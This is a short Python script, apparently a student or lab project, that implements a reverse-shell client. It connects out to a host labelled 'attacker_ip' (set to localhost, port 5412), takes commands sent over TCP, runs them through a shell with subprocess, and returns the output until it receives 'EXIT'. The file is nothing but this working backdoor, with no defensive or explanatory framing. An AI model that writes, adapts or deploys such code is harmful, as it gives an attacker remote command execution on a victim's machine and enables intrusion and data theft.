import subprocess
import platform
import os
import socket

def read_TCP(socket):
    #print("Reading started")
    command = ''
    total_command_length = int(socket.recv(1024).decode())
    print("Total length: " + str(total_command_length))
    buffer = socket.recv(1024)
    command = command + buffer.decode()
    #print("Buffer not empty: " + buffer.decode())
    while len(command.encode("utf-8"))<total_command_length:
        #print("Enter while")
        buffer = socket.recv(1024)
        command = command + buffer.decode()
        #print("reading...")
    print("Command: " + command + " received\n")
    return command
    
def write_TCP(socket, payload):
    #print("Sending output\n")
    socket.send(str(len(str(payload).encode("utf-8"))).encode())
    socket.send(str(payload).encode())
    #print("Output sent: " + str(payload))
    
attacker_ip = '127.0.0.1'
attacker_port = 5412

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim_socket.connect((attacker_ip, attacker_port))

OS_used = platform.system()
OS_info = "OS_used: " + OS_used
print(OS_info)
#write_TCP(victim_socket, OS_info)

running = True

while True:
    command = read_TCP(victim_socket)
    #print("reading done")
    if command == "EXIT":
        break
    process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    output, error = process.communicate()
    output = output.split()
    if process.returncode == 0:
        write_TCP(victim_socket, output)
    else:
        write_TCP(victim_socket, "Error: " + str(error))

victim_socket.close()
